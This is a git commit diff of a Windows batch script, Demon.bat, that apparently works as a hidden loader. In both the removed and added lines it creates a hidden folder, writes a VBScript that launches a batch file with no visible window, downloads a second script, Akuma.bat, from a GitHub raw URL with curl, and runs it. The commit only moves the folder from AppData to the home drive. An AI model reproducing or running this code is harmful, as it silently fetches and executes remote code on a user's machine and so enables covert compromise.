462dc42fd6225568c0ff8d16963a3a27abc2317c
L <112792604+l-urk@users.noreply.github.com>
2023-11-06 16:23:33 -0800

    Update Demon.bat

--- Demon.bat
+++ Demon.bat
@@ -1,9 +1,9 @@
 @echo off
-rmdir /s /q %AppData%\Demon
-mkdir %AppData%\Demon
-attrib +h %AppData%\Demon
-echo Set objShell = CreateObject("WScript.Shell") >> %AppData%\Demon\Demon.vbs
-echo objShell.Run "%AppData%\Demon\Akuma.bat", 0, False >> %AppData%\Demon\Demon.vbs
-curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %AppData%\Demon\akuma.bat
-start %AppData%\Demon\Demon.vbs
+rmdir /s /q %homedrive%\Demon
+mkdir %homedrive%\Demon
+attrib +h %homedrive%\Demon
+echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Demon\Demon.vbs
+echo objShell.Run "%homedrive%\Demon\Akuma.bat", 0, False >> %homedrive%\Demon\Demon.vbs
+curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\Demon\akuma.bat
+start %homedrive%\Demon\Demon.vbs
 exit
